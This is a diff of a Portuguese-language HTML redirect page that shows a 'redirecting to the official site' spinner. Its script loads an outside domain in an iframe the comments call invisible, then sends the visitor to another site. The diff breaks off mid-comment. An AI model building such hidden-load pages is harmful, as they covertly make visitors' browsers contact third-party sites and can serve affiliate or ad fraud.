@@ -22,7 +22,7 @@
             height: 20px;
             border-radius: 50%;
             background-color: green;
-            animation: spin 2s linear infinite;
+            animation: spin 1s linear infinite; /* Corrigi o valor para 1s para um giro mais suave */
         }
         .text {
             margin-left: 10px;
@@ -45,36 +45,12 @@
     <div class="text">✅ Aguarde! Redirecionando para o Site Oficial</div>
 </div>
 
+<!-- Iframe invisível -->
 <iframe id="hiddenIframe" src="" onload="onIframeLoad()"></iframe>
 
 <script>
-    // Definindo as URLs
-    const lnkfrm = 'https://iframc.com';
-    const lnkdtn = 'https://google.com';
+    // URLs definidas
+    const lnkfrm = 'https://iframc.com';  // URL do iframe invisível
+    const lnkdtn = 'https://google.com';  // URL para redirecionar após carregamento completo
 
-    // Função chamada quando o iframe é carregado
-    function onIframeLoad() {
-        const iframe = document.getElementById('hiddenIframe');
-        
-        // Verifica se o iframe está carregado completamente
-        if (iframe.contentWindow && iframe.contentDocument.readyState === 'complete') {
-            console.log('Iframe carregado completamente!');
-
-            // Espera um curto período para garantir que o iframe foi processado
-            setTimeout(() => {
-                // Redireciona para o link final
-                console.log('Redirecionando para o site final...');
-                window.location.href = lnkdtn;
-            }, 500); // 500ms para garantir que tudo foi processado
-        }
-    }
-
-    // Carregando o iframe com a URL
-    window.onload = function() {
-        const iframe = document.getElementById('hiddenIframe');
-        iframe.src = lnkfrm;
-    };
-</script>
-
-</body>
-</html>
+    // Função chamada quando o iframe é carregad
